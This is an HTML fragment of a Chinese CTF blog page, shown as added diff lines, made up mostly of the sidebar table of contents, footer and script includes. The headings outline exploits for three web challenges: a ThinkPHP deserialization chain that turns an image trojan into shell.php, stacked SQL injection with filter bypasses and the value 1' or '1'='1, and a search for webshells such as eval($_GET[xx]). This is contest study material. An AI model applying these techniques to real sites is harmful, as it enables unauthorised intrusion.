+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-upload"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 upload</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们通过dirsearch可以发现源码泄露，下载下来审计。"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">我们通过dirsearch可以发现源码泄露，下载下来审计。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于是赛后复现，就没有将源码放上去。"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">由于是赛后复现，就没有将源码放上去。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先我们先查看thinkphp的路由信息-html-route-route-php-，关注web模块下的控制器方法。"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">首先我们先查看thinkphp的路由信息(html/route/route.php)，关注web模块下的控制器方法。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#先看一下html-application-web-controller-Index-php中的代码，我们需要关注的是login-check方法，这个方法从cookie中获取字符串，并将其反序列化。所以我们可以反序列化任意类。"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">先看一下html/application/web/controller/Index.php中的代码，我们需要关注的是login_check方法，这个方法从cookie中获取字符串，并将其反序列化。所以我们可以反序列化任意类。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#紧接着看html-application-web-controller-Login-php中的代码，Login类里面只有一个login方法，就是常规的登陆检测，没有可利用的地方。再看html-application-web-controller-Profile-php中的代码，在upload-img方法中有上传文件复制操作，而这个操作中的-this-gt-ext-this-gt-filename-tmp-this-gt-filename均可通过反序列化控制。如果我们能调用upload-img这一方法，在知道图片路径的情况下，就可以任意重命名图片文件，可以考虑和图片马相结合。"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">紧接着看html/application/web/controller/Login.php中的代码，Login类里面只有一个login方法，就是常规的登陆检测，没有可利用的地方。再看html/application/web/controller/Profile.php中的代码，在upload_img方法中有上传文件复制操作，而这个操作中的$this-&gt;ext,$this-&gt;filename_tmp,$this-&gt;filename均可通过反序列化控制。如果我们能调用upload_img这一方法，在知道图片路径的情况下，就可以任意重命名图片文件，可以考虑和图片马相结合。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在Profile-php文件末尾还有两个魔术方法，其中-this-gt-except在反序列化时可控，这一就有可能通过call调用任意类方法。继续看Register-php中是否存在可以触发call方法的地方。"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">在Profile.php文件末尾还有两个魔术方法，其中$this-&gt;except在反序列化时可控，这一就有可能通过call调用任意类方法。继续看Register.php中是否存在可以触发call方法的地方。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们看到html-application-web-controller-Register-php文件中存在destruct，其中-this-gt-registed-this-gt-checker在反序列化时也是可控的。如果我们将-this-gt-checker赋值为Register类，而Register类没有index方法，所以调用的时候就会触发call方法，这样就形成了一条完整的攻击链。"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">我们看到html/application/web/controller/Register.php文件中存在destruct，其中$this-&gt;registed,$this-&gt;checker在反序列化时也是可控的。如果我们将$this-&gt;checker赋值为Register类，而Register类没有index方法，所以调用的时候就会触发call方法，这样就形成了一条完整的攻击链。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最终用下面生成的-EXP-作为-cookies-访问网页，即可将原来上传的图片马名字修改成-shell-php-，依次找-flag-即可。"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">最终用下面生成的 EXP 作为 cookies 访问网页，即可将原来上传的图片马名字修改成 shell.php ，依次找 flag 即可。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#魔法方法的测试"><span class="nav-number">1.0.1.9.</span> <span class="nav-text">魔法方法的测试</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#图片木马的生成方式"><span class="nav-number">1.0.1.10.</span> <span class="nav-text">图片木马的生成方式:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-ljdd520-github-io-2020-01-16-E5-9B-BE-E7-89-87-E6-9C-A8-E9-A9-AC-E5-88-B6-E4-BD-9C-E5-A4-A7-E6-B3-95-more"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">https://ljdd520.github.io/2020/01/16/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C%E5%A4%A7%E6%B3%95/#more</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-随便注"><span class="nav-number">1.0.2.</span> <span class="nav-text">0x02 随便注</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#由于是赛后复现因此我们先看看源码："><span class="nav-number">1.0.2.1.</span> <span class="nav-text">由于是赛后复现因此我们先看看源码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法一："><span class="nav-number">1.0.2.2.</span> <span class="nav-text">方法一：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#fuzz一下，会发现ban了以下字符："><span class="nav-number">1.0.2.3.</span> <span class="nav-text">fuzz一下，会发现ban了以下字符：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#发现支持多语句查询。查表语句为："><span class="nav-number">1.0.2.4.</span> <span class="nav-text">发现支持多语句查询。查表语句为：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于过滤了select等关键字，我们可以用预编译来构造带有select的sql语句。"><span class="nav-number">1.0.2.5.</span> <span class="nav-text">由于过滤了select等关键字，我们可以用预编译来构造带有select的sql语句。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果显示："><span class="nav-number">1.0.2.6.</span> <span class="nav-text">结果显示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#既然是用strstr来匹配关键字，那么直接大小写关键字绕过："><span class="nav-number">1.0.2.7.</span> <span class="nav-text">既然是用strstr来匹配关键字，那么直接大小写关键字绕过：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#方法二："><span class="nav-number">1.0.2.8.</span> <span class="nav-text">方法二：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#知识点：堆叠注入"><span class="nav-number">1.0.2.9.</span> <span class="nav-text">知识点：堆叠注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#先来随便测试一下，看看是否有注入。"><span class="nav-number">1.0.2.10.</span> <span class="nav-text">先来随便测试一下，看看是否有注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#测试一下过滤了哪些函数："><span class="nav-number">1.0.2.11.</span> <span class="nav-text">测试一下过滤了哪些函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#过滤了select-update-delete-drop-insert-where和-。"><span class="nav-number">1.0.2.12.</span> <span class="nav-text">过滤了select,update,delete,drop,insert,where和.。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#那么我们测试一波看看是不是有堆叠注入。"><span class="nav-number">1.0.2.13.</span> <span class="nav-text">那么我们测试一波看看是不是有堆叠注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看看这个数字为名字的表里面有什么。看看有没有flag。"><span class="nav-number">1.0.2.14.</span> <span class="nav-text">我们可以看看这个数字为名字的表里面有什么。看看有没有flag。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后是words表，看起来就是默认查询的表了。"><span class="nav-number">1.0.2.15.</span> <span class="nav-text">然后是words表，看起来就是默认查询的表了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#它既然没有过滤alter和rename，那么我们是不是可以把表改个名字，再给列改个名字吗？先把words改名为words1，再把这个数字表改名为words，然后把新的words里的flag列改为id-避免一开始无法查询-。这样就可以让程序直接查询出flag了。"><span class="nav-number">1.0.2.16.</span> <span class="nav-text">它既然没有过滤alter和rename，那么我们是不是可以把表改个名字，再给列改个名字吗？先把words改名为words1，再把这个数字表改名为words，然后把新的words里的flag列改为id(避免一开始无法查询)。这样就可以让程序直接查询出flag了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#构造的payload如下，然后访问，看到这个看来就执行到最后一个语句了。"><span class="nav-number">1.0.2.17.</span> <span class="nav-text">构造的payload如下，然后访问，看到这个看来就执行到最后一个语句了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用1-39-or-39-1-39-39-1访问一下。"><span class="nav-number">1.0.2.18.</span> <span class="nav-text">用1&#39; or &#39;1&#39;=&#39;1访问一下。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-高明的黑客"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x03 高明的黑客</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#从题目的源码来看，好像黑客留了shell，我们需要从这些源码中找到正真的shell-。"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">从题目的源码来看，好像黑客留了shell，我们需要从这些源码中找到正真的shell.。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们先搜搜常见的shell，类似eval-GET-xx-或者system-GET-xx-。这里通过程序来寻找shell。"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">我们先搜搜常见的shell，类似eval($_GET[xx])或者system($_GET[xx])。这里通过程序来寻找shell。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最终发现正真的shell，直接连上查找flag即可。"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">最终发现正真的shell，直接连上查找flag即可。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.0.4.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-mochazz-github-io-2019-05-27-2019-E5-BC-BA-E7-BD-91-E6-9D-AFWeb-E9-83-A8-E5-88-86-E9-A2-98-E8-A7-A3-upload"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">https://mochazz.github.io/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#upload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-zhaoj-in-read-5873-html"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">https://www.zhaoj.in/read-5873.html</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">124.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
